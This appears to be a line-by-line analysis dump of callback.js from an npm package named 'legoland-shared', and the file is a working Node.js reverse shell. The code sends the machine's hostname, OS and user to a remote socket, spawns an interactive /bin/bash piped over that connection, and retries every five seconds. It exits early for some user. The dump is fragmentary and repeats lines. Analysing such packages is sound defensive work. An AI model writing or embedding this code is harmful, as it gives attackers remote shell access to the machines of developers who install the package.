// File: tmp/tmpcebd2d_s/legoland-shared/package/callback.js
// ======================================================================
Line 1: const net = require("net")
Line 2: _tmp_7 = require("child_process")
Line 3: const os = require("os")
Line 6: os.userInfo()
Line 7: {
    console.log(`[!] Skipping reverse shell for user: ${user}`);
    process.exit(0); // خروج امن
}
Line 8: console.log(`[!] Skipping reverse shell for user: ${user}`)
Line 9: process.exit(0)
Line 17: const client = new net.Socket()
Line 19: {
        client.write(
            `[*] Reverse shell connected!\n` +
            `[*] Host: ${os.hostname()} (${os.platform()} ${os.release()})\n` +
            `[*] User: ${user}\n\n`
        );

        const sh = spawn("/bin/bash", ["-i"], { stdio: ["pipe", "pipe", "pipe"] });

        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);

        sh.on("exit", () => {
            client.end("[*] Shell exited, reconnecting...\n");
        });

        client.on("data", (data) => {
            if (data.toString().trim() === "\x03") { // Ctrl+C
                sh.kill("SIGINT");
            }
        });
    }
Line 20: client.write(
            `[*] Reverse shell connected!\n` +
            `[*] Host: ${os.hostname()} (${os.platform()} ${os.release()})\n` +
            `[*] User: ${user}\n\n`
        )
Line 21: `[*] Reverse shell connected!\n` +
            `[*] Host: ${os.hostname()} (${os.platform()} ${os.release()})\n` +
            `[*] User: ${user}\n\n`
Line 22: <operator>.formatString("[*] Host: ", os.hostname(), " (", os.platform(), " ", os.release(), ")\n")
Line 23: <operator>.formatString("[*] User: ", user, "\n\n")
Line 26: const sh = spawn("/bin/bash", ["-i"], { stdio: ["pipe", "pipe", "pipe"] })
Line 28: client.pipe(sh.stdin)
Line 29: sh.stdout.pipe(client)
Line 30: sh.stderr.pipe(client)
Line 32: {
            client.end("[*] Shell exited, reconnecting...\n");
        }
Line 33: client.end("[*] Shell exited, reconnecting...\n")
Line 37: data.toString().trim()
Line 38: sh.kill("SIGINT")
Line 43: {
        console.error(`[!] Connection error: ${err.message}`);
        setTimeout(connect, 5000); // تلاش مجدد
    }
Line 44: console.error(`[!] Connection error: ${err.message}`)
Line 45: setTimeout(connect, 5000)
Line 48: {
        console.warn("[!] Disconnected, retrying...");
        setTimeout(connect, 5000);
    }
Line 49: console.warn("[!] Disconnected, retrying...")
Line 50: setTimeout(connect, 5000)
